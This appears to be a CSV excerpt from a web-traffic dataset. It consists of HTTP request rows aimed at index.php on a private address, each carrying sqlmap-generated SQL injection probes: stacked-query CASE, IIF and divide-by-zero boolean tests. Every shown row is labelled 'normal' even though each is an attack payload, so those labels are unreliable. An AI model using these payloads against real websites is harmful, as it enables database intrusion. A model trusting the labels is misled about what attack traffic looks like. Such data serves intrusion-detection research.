/,,*/* close,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") where 2220=2220;select (case when (7608=7027) then 7608 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 2411=2411;select (case when (4138=2916) then 4138 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 3444=3444;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' where 2334=2334;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php where 8017=8017;select (case when (3040=5110) then 3040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php where 6481=6481;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'qzxx' where 6603=6603;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select ehna where 6135=6135;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'dmnm' where 5582=5582;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as csbx where 8787=8787;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)) as mlsh where 8044=8044;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as efmh where 1415=1415;select (case when (5065=8895) then 5065 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as wxke where 8681=8681;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) as fkpa where 8851=8851;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 1862=1862;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php`) where 9894=9894;select (case when (5566=5662) then 5566 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' in boolean mode);select (case when (1060=9974) then 1060 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php);iif(9601=2042,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php');iif(7649=9326,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php');iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"";iif(9785=8253,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)));iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php;iif(6185=2022,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));iif(9542=9360,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')));iif(7281=5464,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')));iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");iif(3804=7974,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php""));iif(8331=5778,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")));iif(2960=2923,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%');iif(2056=9646,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%'));iif(9134=8963,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%')));iif(3097=5398,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%')));iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"");iif(2958=9155,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%""));iif(3766=9631,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));iif(7248=9502,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"";iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') where 2642=2642;iif(2301=3581,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") where 2696=2696;iif(5545=6523,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") where 2346=2346;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 9028=9028;iif(3319=7909,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 3514=3514;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php where 4047=4047;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'gknl' from dual where 9079=9079;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'buir' where 9933=9933;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'xkoq' where 2054=2054;iif(6586=7585,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'zlkl' where 1354=1354;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')) as ucsg where 7569=7569;iif(9688=1907,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as quee where 1078=1078;iif(7349=2000,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)) as qvqy where 4930=4930;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') as jgmv where 8595=8595;iif(2754=4723,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as avdz where 4975=4975;iif(4774=5871,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 1783=1783;iif(4249=5197,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php`) where 1071=1071;iif(2013=5539,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php`) where 3104=3104;iif(6814=6814,1,1/0) sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php);select case when 4695=7811 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"";select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php));select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)));select case when 3997=5428 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")));select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%'));select case when 9814=2482 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%';select case when 6686=6539 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"");select case when 8718=9890 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%""));select case when 7613=3191 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));select case when 5030=5693 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"";select case when 3357=7836 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') where 2615=2615;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 7691=7691;select case when 3651=5876 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 9398=9398;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' where 6742=6742;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"" where 5965=5965;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'mmdb' from dual where 5444=5444;select case when 1595=5719 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'lcdu' where 5106=5106;select case when 6427=8678 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select ztio where 2361=2361;select case when 8093=4833 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'hbcq' where 5622=5622;select case when 3798=6986 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')) as xper where 3286=3286;select case when 9693=4200 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as itet where 3535=3535;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)) as wqba where 5189=5189;select case when 8539=3587 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') as xykx where 3112=3112;select case when 6192=1383 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as trsr where 8300=8300;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) as fbvc where 5150=5150;select case when 5355=3753 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 8207=8207;select case when 5066=2281 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 6646=6646;select case when 6195=6195 then 1 else null end-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
